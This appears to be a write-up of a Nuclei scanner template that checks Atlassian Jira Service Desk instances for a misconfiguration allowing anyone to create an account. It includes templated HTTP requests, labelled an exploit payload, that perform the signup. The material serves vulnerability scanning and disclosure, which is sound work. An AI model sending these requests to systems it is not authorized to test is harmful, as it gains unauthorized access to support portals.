# Nuclei Template: Atlassian Jira Service Desk Signup
**Template ID:** jira-servicedesk-signup
**Vulnerability Class:** Improper Authentication - Generic
**Severity:** Medium
**CWE:** CWE-287
**Source:** Nuclei Template (`jira-servicedesk-signup.yaml`)

## Vulnerability Information & PoC

## Description
This instance of Atlassian JIRA is misconfigured to allow an attacker to sign up (create a new account) just by navigating to the signup page that is accessible at the URL /servicedesk/customer/user/signup. After the attacker has created a new account it's possible for him/her to access the support portal.

## Steps to reproduce / Exploit Payload
```http
GET /servicedesk/customer/user/signup HTTP/1.1
Host: {{Hostname}}

POST /servicedesk/customer/user/signup HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Origin: {{RootURL}}
Referer: {{RootURL}}/servicedesk/customer/user/signup

{"email":"","fullname":"{{randstr}}","password":"","captcha":"","secondaryEmail":""}

GET /secure/Signup!default.jspa HTTP/1.1
Host: {{Hostname}}

POST /secure/Signup.jspa HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{RootURL}}
Referer: {{RootURL}}/secure/Signup.jspa

email=&fullname={{randstr}}&username=&password=&Signup=Sign+up
```

## References
- https://www.acunetix.com/vulnerabilities/web/atlassian-jira-servicedesk-misconfiguration/
